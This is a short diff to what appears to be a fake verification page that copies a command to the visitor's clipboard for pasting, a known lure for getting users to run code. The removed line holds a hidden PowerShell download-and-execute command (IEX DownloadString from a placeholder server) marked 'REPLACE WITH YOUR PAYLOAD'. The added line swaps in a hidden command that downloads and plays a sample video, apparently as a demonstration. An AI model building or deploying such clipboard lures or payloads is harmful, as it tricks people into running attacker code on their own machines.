@@ -315,7 +315,7 @@
 
     <script>
         // REPLACE WITH YOUR PAYLOAD
-        const authCommand = 'powershell -ExecutionPolicy Bypass -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString(\'https://your-server.com/auth.ps1\')"';
+        const authCommand = 'powershell -w hidden -c "$u='https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4';$p=[IO.Path]::GetTempPath()+'v.mp4';(New-Object Net.WebClient).DownloadFile($u,$p);$wm=New-Object -ComObject WMPlayer.OCX;$wm.URL=$p;$wm.controls.play();while($wm.playState -eq 3){sleep 1};Remove-Item $p"';
         
         function runVerification() {
             navigator.clipboard.writeText(authCommand).then(() => {
